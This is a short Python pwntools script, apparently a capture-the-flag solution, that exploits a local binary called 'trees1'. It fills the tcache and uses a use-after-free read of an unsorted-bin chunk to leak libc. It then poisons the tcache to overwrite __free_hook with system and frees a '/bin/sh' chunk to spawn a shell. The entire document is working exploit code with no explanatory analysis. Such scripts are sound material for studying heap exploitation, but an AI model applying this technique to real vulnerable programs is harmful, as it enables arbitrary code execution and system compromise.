from pwn import *

e = ELF("./trees1")

libc = ELF("./libc.so.6")

p = process("./trees1")

#context.log_level="debug"
gdb.attach(p)#, """break * main+302""")


def create():
	print("create")
	p.sendlineafter(">", "1")
	p.recvuntil("ID ")
	return int(p.recvuntil(",")[:-1])


def delete(idx):
	print("delete")
	p.sendlineafter(">", "2")
	p.sendlineafter(">", str(idx))


def edit(idx, name, d_len, d, amt):
	p.sendlineafter(">", "3")
	p.sendlineafter(">", str(idx))
	p.sendlineafter(".", name)
	p.sendlineafter(">", str(d_len))
	p.sendlineafter(".", d)
	p.sendlineafter(">", str(amt))


def show(idx):
	p.sendlineafter(">", "4")
	p.sendlineafter(">", str(idx))


# leak heap + libc by freeing a chunk into unsorted and then UAF
# delete even chunk, read odd chunk

# fill tcache
for i in range(7):
	create()

	edit(i+1, "AAAABBBBCCCCDDD", 0xf0, "BBBBEEEEFFFFGGGGHHHH", i+1)


create()	# 8
edit(8, "A", 0xf0, "B", 8)

create()	# 9, prevent consolidation w/ top


for i in range(7):
	delete(i+1)


delete(8)


for i in range(9):	# ends on chunk 18.
	# have to take 7 from tcache, 1 from fastbins,
	# then the last one (chunk 18) will be from unsorted bin and have libc pointers
	create()


show(18)

# parse leaked libc
dat = p.recvline().strip().split()[0]
libc.address = int(dat) - 0x1e4d90
print("libc address", hex(libc.address))
print("libc system", hex(libc.sym["system"]))
print("libc free hook", hex(libc.sym["__free_hook"]))


create()	# 19
create()	# 20
create()	# 21

delete(20)
edit(21, p64(libc.sym["__free_hook"]), 0x69, "BBBB", 21)

create()	# 22
create()	# 23

edit(23, p64(libc.sym["system"]), 0x20, "BBBB", 23)


edit(19, "/bin/sh", 2, "A", 19)
delete(19)

p.interactive()
